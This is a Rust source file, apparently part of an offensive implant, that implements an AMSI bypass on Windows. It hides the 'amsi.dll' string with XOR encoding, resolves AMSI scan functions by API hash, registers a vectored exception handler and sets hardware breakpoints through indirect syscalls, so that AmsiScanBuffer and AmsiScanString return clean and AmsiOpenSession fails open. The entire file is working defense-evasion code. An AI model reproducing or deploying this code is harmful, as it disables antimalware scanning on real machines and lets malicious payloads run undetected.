#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::EXCEPTION_SINGLE_STEP,
    System::Diagnostics::Debug::{EXCEPTION_POINTERS, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64},
};
#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
use windows_sys::Win32::System::Diagnostics::Debug::AddVectoredExceptionHandler;

#[cfg(target_os = "windows")]
static mut AMSI_ADDR: usize = 0;

#[cfg(target_os = "windows")]
static mut AMSI_SCAN_STRING_ADDR: usize = 0;

#[cfg(target_os = "windows")]
static mut AMSI_OPEN_SESSION_ADDR: usize = 0;

#[cfg(target_os = "windows")]
pub unsafe fn install_amsi_bypass() {
    use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
    use crate::resolve::api_hash::h;
    let amsi_h = h::DLL_AMSI;

    // Try PEB first; if not loaded, force-load via LdrLoadDll then re-check PEB.
    #[cfg(target_arch = "x86_64")]
    let amsi_base: *const u8 = {
        let b = peb_get_module_base(amsi_h);
        if b.is_null() {
            // "amsi.dll" XOR 0x13 — decoded on stack so no plaintext string in .rodata
            let mut amsi_n = [0x72u8, 0x7E, 0x60, 0x7A, 0x3D, 0x77, 0x7F, 0x7F, 0u8];
            for b in amsi_n[..8].iter_mut() { *b ^= 0x13; }
            crate::evasion::module_stomp::ldr_load_dll_by_name(&amsi_n);
            let b2 = peb_get_module_base(amsi_h);
            if b2.is_null() { return; }
            b2
        } else { b }
    };
    #[cfg(not(target_arch = "x86_64"))]
    let amsi_base: *const u8 = {
        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
        let mut h = GetModuleHandleA(b"amsi.dll\0".as_ptr()) as *const u8;
        if h.is_null() {
            windows_sys::Win32::System::LibraryLoader::LoadLibraryA(b"amsi.dll\0".as_ptr());
            h = GetModuleHandleA(b"amsi.dll\0".as_ptr()) as *const u8;
            if h.is_null() { return; }
        }
        h
    };

    // Resolve AMSI functions by pre-computed hash — no name strings in binary.
    AMSI_ADDR = match resolve_by_hash(amsi_base, h::AMSI_SCAN_BUF) {
        Some(p) => p as usize,
        None    => return,
    };
    AMSI_SCAN_STRING_ADDR = match resolve_by_hash(amsi_base, h::AMSI_SCAN_STR) {
        Some(p) => p as usize,
        None    => 0,
    };
    AMSI_OPEN_SESSION_ADDR = match resolve_by_hash(amsi_base, h::AMSI_OPEN_SES) {
        Some(p) => p as usize,
        None    => 0,
    };

    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
    #[cfg(target_arch = "x86_64")]
    {
        use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
        let ntdll = peb_get_module_base(h::DLL_NTDLL);
        if let Some(fn_ptr) = resolve_by_hash(ntdll, h::RTL_VEH) {
            type RtlVeh = unsafe extern "system" fn(usize, *const core::ffi::c_void) -> *mut core::ffi::c_void;
            let f: RtlVeh = core::mem::transmute(fn_ptr);
            f(1, amsi_veh_handler as usize as *const core::ffi::c_void);
        }
    }
    #[cfg(not(target_arch = "x86_64"))]
    AddVectoredExceptionHandler(1, Some(amsi_veh_handler));

    let thread: isize = !1isize; // -2 = current thread pseudo-handle
    let mut ctx: CONTEXT = core::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    if let Some((ssn_get, tramp_get)) = get_ssn_h(h::NT_GET_CTX) {
        indirect_syscall(ssn_get, tramp_get, thread as usize, &mut ctx as *mut CONTEXT as usize, 0, 0, 0, 0);
    }
    ctx.Dr0  = AMSI_ADDR as u64;
    ctx.Dr7 |= 0x1;
    if AMSI_SCAN_STRING_ADDR != 0 {
        ctx.Dr2  = AMSI_SCAN_STRING_ADDR as u64;
        ctx.Dr7 |= 0x10;
    }
    if AMSI_OPEN_SESSION_ADDR != 0 {
        ctx.Dr3  = AMSI_OPEN_SESSION_ADDR as u64;
        ctx.Dr7 |= 0x40;
    }
    if let Some((ssn_set, tramp_set)) = get_ssn_h(h::NT_SET_CTX) {
        indirect_syscall(ssn_set, tramp_set, thread as usize, &ctx as *const CONTEXT as usize, 0, 0, 0, 0);
    }
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn amsi_veh_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH:    i32 =  0;

    let record  = &*(*info).ExceptionRecord;
    let context = &mut *(*info).ContextRecord;

    if record.ExceptionCode == EXCEPTION_SINGLE_STEP {
        if context.Rip == AMSI_ADDR as u64 || context.Rip == AMSI_SCAN_STRING_ADDR as u64 {
            context.Rax = 0;
            context.Rip = *(context.Rsp as *const u64);
            context.Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        if context.Rip == AMSI_OPEN_SESSION_ADDR as u64 {
            context.Rax = 0x80070057u64; // E_INVALIDARG — causes AMSI to fail open
            context.Rip = *(context.Rsp as *const u64);
            context.Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    EXCEPTION_CONTINUE_SEARCH
}
